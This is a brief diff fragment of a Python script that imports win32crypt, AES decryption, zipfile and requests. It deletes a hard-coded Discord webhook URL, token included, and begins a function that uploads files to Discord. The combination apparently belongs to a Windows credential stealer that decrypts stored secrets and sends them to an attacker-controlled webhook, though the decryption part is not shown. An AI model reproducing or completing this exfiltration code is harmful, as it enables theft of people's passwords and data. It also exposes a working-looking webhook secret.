@@ -7,7 +7,6 @@ import requests
 import zipfile
 from Crypto.Cipher import AES
 import win32crypt
-webhook_url = "https://discord.com/api/webhooks/1327334684254015579/R_IKKdTONzKpZpYTQ6FgA0dhxXY-n43GjgMYDgJaMmrUTC1GnNHfaTTGJCnuW-WMyisW"
 def send_file_to_discord(file_path):
     with open(file_path, 'rb') as file:
         response = requests.post(
